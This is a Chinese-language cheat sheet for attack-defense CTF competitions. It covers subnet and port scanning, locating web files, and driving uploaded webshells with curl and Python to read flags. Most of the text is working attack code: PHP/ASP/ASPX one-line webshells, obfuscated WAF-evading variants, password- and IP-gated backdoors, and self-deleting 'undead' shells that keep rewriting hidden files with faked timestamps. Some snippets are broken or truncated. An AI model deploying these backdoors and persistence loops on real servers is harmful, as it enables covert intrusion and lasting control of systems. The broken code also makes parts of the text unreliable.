# 主机嗅探

C段存活扫描

nmap

    
    
    namp -sn 192.168.0.0/24
    

httpscan

    
    
    httpscan.py 192.168.0.0/24 –t 10
    

# 端口扫描

    
    
    nmap -sV 192.168.0.2            #扫描主机系统版本
    nmap -sS 192.168.0.2            #扫描主机常用端口
    nmap -sS -p 80,445 192.168.0.2  #扫描主机部分端口
    nmap -sS -p- 192.168.0.2        #扫描主机全部端口
    

nmap官方文档：  
<https://nmap.org/man/zh/man-host-discovery.html>

httpscan工具：  
<https://github.com/zer0h/httpscan>

python脚本

    
    
    import requests
    for x in range(2,255): 
        url = "http://192.168.1.{}".format(x) 
        try: 
            r = requests.post(url) 
            print(url) 
            except: 
            pass
    

# 关键文件检索

组件检索

    
    
    find / -name "apaech2.conf"               #检索apache主配置文件
    find / -name "nginx.conf"                 #检索nginx目录
    find / -path "*nginx*" -name nginx*conf   #检索nginx配置目录
    find / -name "httpd.conf"                 #检索apache目录
    find / -path "*apache*" -name apache*conf #检索apache配置目录
    

网站首页

    
    
    find / -name "index.php"   #定位网站目录
    

日志文件检索

    
    
    /var/log/nginx/    #默认Nginx日志目录
    /var/log/apache/   #默认Apache日志目录
    /var/log/apache2/  #默认Apache日志目录
    /usr/local/tomcat/logs #Tomcat日志目录
    tail -f xxx.log   #实时刷新滚动日志文件
    

备份检索

<https://github.com/sry309/ihoneyBakFileScan> 多进程批量网站备份文件泄露扫描工具

# 上传后们

curl(跟hackbar差不多)

    
    
    C:\Users\admin>curl "http://192.168.182.130:8801/include/shell.php" -d "admin_ccmd=system('cat /f*');"
    #向shell.php文件里传入参数并返回结果
    

python多端口传参

    
    
    #coding=utf-8
    import requests
    url_head="http://192.168.182.130"   #网段
    url=""
    shell_addr="/upload/url/shell.php" #木马路径
    passwd="pass"                   #木马密码
    #port="80"
    payload = {passwd: 'System(\'cat /flag\');'}
    # find / -name "flag*"
    
    #清空上次记录
    flag=open("flag.txt","w")
    flag.close()
    
    flag=open("flag.txt","a")
    
    
    for i in range(8000,8004):
        url=url_head+":"+str(i)+shell_addr
        try:
            res=requests.post(url,payload)#,timeout=1
            if res.status_code == requests.codes.ok:
                result = res.text
                print (result)
                flag.write(result+"\n") 
            else:
                print ("shell 404")
        except:
            print (url+" connect shell fail")
    
    flag.close()
    

# 一句话木马

常见一句话木马

    
    
    php： <?php @eval($_POST['pass']);?>      <?php eval($_GET['pass']);
    asp：   <%eval request ("pass")%>
    aspx：  <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>

get型木马

    
    
    <?php eval($_GET['pass']);
    
    /shell.php?pass=eval($_POST[1]);
    

# shell文件名隐藏

**命名为.shell.php**

.shell.php在执行ls时无法被查看到，搭配ls的参数才能被发现

![](./img/6424208565021706682.png)

**命名为-shell.php**

命令行会把-后面的内容当成参数执行

![](./img/7506696774223171979.png)

# 木马绕waf

shell1：

    
    
    <?php ($_=@$_GET[2]).@$_($_POST[1])?>

连接方式：php?2=assert密码是1。

shell2：

    
    
    <?php
    $a=chr( 96^5);
    $b=chr( 57^79);
    $c=chr( 15^110);
    $d=chr( 58^86);
    $e= '($_REQUEST[C])';
    @assert($a.$b.$c.$d.$e);
    ?>
    

配置为?b=))99(rhC(tseuqeR+lave

shell3：

    
    
    <?php
    $sF= "PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['n985de9'];if(isset($s22)){eval($s21($s22));}
    ?>
    

配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs=  
连接密码:0（零）

shell4：MD5木马

比赛时有的队伍批量种马，但被攻击的服务却可以通过分析本地的木马，然后去连接其他服务器内的相同木马获取flag。

md5验证木马由此产生。防止其他队伍进行分析。

    
    
    <?php
    if(md5($_POST['pass'])=='d8d1a1efe0134e2530f503028a825253')//rcoil
    @eval($_POST['cmd']);
    ?>
    

shell5：MD5木马+利用header

    
    
    <?php
    echo 'hello';
    if(md5($_POST['pass'])=='d8d1a1efe0134e2530f503028a825253')//rcoil
    if (@$_SERVER['HTTP_USER_AGENT'] == 'flag'){
    //@符号" 是用于抑制错误报告，如果该行代码产生了错误，错误信息不会显示出来。
    $test= 'flag';
    header("flag:$test");
    }
    ?>
    

shell 6： **IP验证木马**

    
    
    <?php
    
    $ip="x.x.x.x"; //自己的ip
    
    if ($_SERVER['REMOTE_ADDR']===$ip)
    
    {
    
        @eval($_POST["cmd"]);
    
    }
    

shell7：混淆马1

    
    
    <?php   // <?php assert($_POST[-7]); ?>            
    
    @$_='s'.'s'./*-/*-*/'e'./*-/*-*/'r';              
    
    @$_=/*-/*-*/'a'./*-/*-*/$_./*-/*-*/'t';              
    
    @$_/*-/*-*/($/*-/*-*/{'_P'./*-/*-*/'OS'./*-/*-*/'T'}              
    
    [/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]);
    

shell8：混淆马2

    
    
    <?php  //$_POST[0]($_POST[1]);
    
    @$_++; // $_ = 1  
    
    $__=("#"^"|"); // $__ = _  
    
    $__.=("."^"~"); // _P  
    
    $__.=("/"^"`"); // _PO  
    
    $__.=("|"^"/"); // _POS  
    
    $__.=("{"^"/"); // _POST  
    
    ${$__}[!$_](${$__}[$_]); // 
    
    ?>
    

# 不死马

简单不死马

    
    
    <?php
    
    set_time_limit(0);   //PHP脚本限制了执行时间，set_time_limit(0)设置一个脚本的执行时间为无限长
    
    ignore_user_abort(1);  //ignore_user_abort如果设置为 TRUE，则忽略与用户的断开,脚本将继续运行。
    
    unlink(__FILE__);     //删除自身
    
    while(1)
    
    {  
    
        file_put_contents('shell.php','<?php @eval($_POST["password"]);?>');  //创建shell.php
    
        sleep(0);    //间隔时间
    
    }
    

**对付这种木马，目前最有效的办法就是重启PHP服务器。**

**但在awd模式下，一般无权限，**

**可以通过不断复写shell.php来达到该木马难以被使用的效果**

    
    
    <?php
    
    set_time_limit(0);   // 取消脚本运行时间的超时上限
    
    ignore_user_abort(1);  // 后台运行
    
    
    while(1)
    
    {  
    
        file_put_contents('shell.php','11111111');  //创建shell.php
    
        sleep(0);
    
    }
    

进阶不死马

    
    
    <?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = 'shell.php';
    $code = '<?php if(md5($_POST["passwd"])=="6daf17e539bf44591fad8c81b4a293d7"){@eval($_REQUEST['cmd']);} ?>';
    while (1){
        file_put_contents($file,$code);
        system('touch -m -d "2018-12-01 09:10:12" shell2.php');//修改时间，防止被删
        usleep(5000);
    }
    ?>
    
    #passwd=y0range857
    #POST传参：passwd=y0range857&a=system('ls');
    

将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为shell2.php的shell文件

写入shell， yj.php内容

    
    
    <?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = '.login.php';
    $file1 = '/admin/.register.php'; 
    $code = '<?php if(md5($_GET["passwd"])=="6daf17e539bf44591fad8c81b4a293d7"){@eval($_REQUEST["at"]);} ?>';
    while (1){
        file_put_contents($file,$code);
        system('touch -m -d "2018-12-01 09:10:12" .login.php');
        file_put_contents($file1,$code);
        system('touch -m -d "2018-12-01 09:10:12" /admin/.register.php');
        usleep(5000);
    }
    ?>
    

浏览器访问yj.php，会生成不死马.login.php /admin/.register.php

# 权限维持

1、不死马

    
    
    <?php 
    ignore_user_abort(true);  #客户机断开依旧执行
    set_time_limit(0); #函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。
    unlink(__FILE__);  删除文件本身，以起到隐蔽自身的作用。
    $file = '2.php';
    $code = '<?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72"){@eval($_POST[a]);} ?>';
    while (1){
        file_put_contents($file,$code);
        system('touch -m -d "2018-12-01 09:10:12" .2.php');
        usleep(5000);
    } 
    ?>
    

2、隐藏的文件读取

    
    
    <?php
    header(php'flag:'.file_get_contents('/tmp/flag'));
    

内容被截断缺失，后面补充

条件允许的话，将flag信息直接读取并返回到header头中，这样做不易被发现。

